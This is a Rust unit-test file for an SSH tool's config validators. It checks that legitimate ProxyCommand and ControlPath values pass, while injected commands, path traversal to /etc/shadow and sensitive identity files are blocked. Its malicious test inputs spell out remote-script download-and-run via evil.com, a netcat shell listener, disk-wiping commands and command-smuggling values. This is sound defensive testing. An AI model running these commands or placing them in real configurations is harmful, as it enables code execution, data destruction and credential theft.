// Copyright 2025 Lablup Inc. and Jeongkyu Shin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#[cfg(test)]
mod tests {
    use super::super::*;
    use super::super::checks::validate_identity_file_security;
    use std::path::Path;

    #[test]
    fn test_validate_executable_string_legitimate() {
        // Test legitimate ProxyCommand values that should pass
        let legitimate_commands = vec![
            "ssh -W %h:%p gateway.example.com",
            "connect -S proxy.example.com:1080 %h %p",
            "none",
            "socat - PROXY:proxy.example.com:%h:%p,proxyport=8080",
        ];

        for cmd in legitimate_commands {
            let result = validate_executable_string(cmd, "ProxyCommand", 1);
            assert!(result.is_ok(), "Legitimate command should pass: {cmd}");
        }
    }

    #[test]
    fn test_validate_executable_string_malicious() {
        // Test malicious commands that should be blocked
        let malicious_commands = vec![
            "ssh -W %h:%p gateway.example.com; rm -rf /",
            "ssh -W %h:%p gateway.example.com | bash",
            "ssh -W %h:%p gateway.example.com & curl evil.com",
            "ssh -W %h:%p `whoami`",
            "ssh -W %h:%p $(whoami)",
            "curl http://evil.com/malware.sh | bash",
            "wget -O - http://evil.com/script | sh",
            "nc -l 4444 -e /bin/sh",
            "rm -rf /important/files",
            "dd if=/dev/zero of=/dev/sda",
        ];

        for cmd in malicious_commands {
            let result = validate_executable_string(cmd, "ProxyCommand", 1);
            assert!(
                result.is_err(),
                "Malicious command should be blocked: {cmd}"
            );

            let error = result.unwrap_err().to_string();
            assert!(
                error.contains("Security violation"),
                "Error should mention security violation for: {cmd}. Got: {error}"
            );
        }
    }

    #[test]
    fn test_validate_control_path_legitimate() {
        let legitimate_paths = vec![
            "/tmp/ssh-control-%h-%p-%r",
            "~/.ssh/control-%h-%p-%r",
            "/var/run/ssh-%u-%h-%p",
            "none",
        ];

        for path in legitimate_paths {
            let result = validate_control_path(path, 1);
            assert!(result.is_ok(), "Legitimate ControlPath should pass: {path}");
        }
    }

    #[test]
    fn test_validate_control_path_malicious() {
        let malicious_paths = vec![
            "/tmp/ssh-control; rm -rf /",
            "/tmp/ssh-control | bash",
            "/tmp/ssh-control & curl evil.com",
            "/tmp/ssh-control`whoami`",
            "/tmp/ssh-control$(whoami)",
            "-evil-flag",
        ];

        for path in malicious_paths {
            let result = validate_control_path(path, 1);
            assert!(
                result.is_err(),
                "Malicious ControlPath should be blocked: {path}"
            );
        }
    }

    #[test]
    fn test_secure_validate_path_traversal() {
        let traversal_paths = vec![
            "../../../etc/passwd",
            "/home/user/../../../etc/shadow",
            "~/../../../etc/hosts",
        ];

        for path in traversal_paths {
            let result = secure_validate_path(path, "identity", 1);
            assert!(result.is_err(), "Path traversal should be blocked: {path}");

            let error = result.unwrap_err().to_string();
            assert!(
                error.contains("traversal") || error.contains("Security violation"),
                "Error should mention traversal for: {path}. Got: {error}"
            );
        }
    }

    #[test]
    fn test_validate_identity_file_security() {
        // Test sensitive system files
        let sensitive_paths = vec![
            Path::new("/etc/passwd"),
            Path::new("/etc/shadow"),
            Path::new("/proc/version"),
            Path::new("/dev/null"),
        ];

        for path in sensitive_paths {
            let result = validate_identity_file_security(path, 1);
            assert!(
                result.is_err(),
                "Sensitive path should be blocked: {}",
                path.display()
            );
        }
    }
}
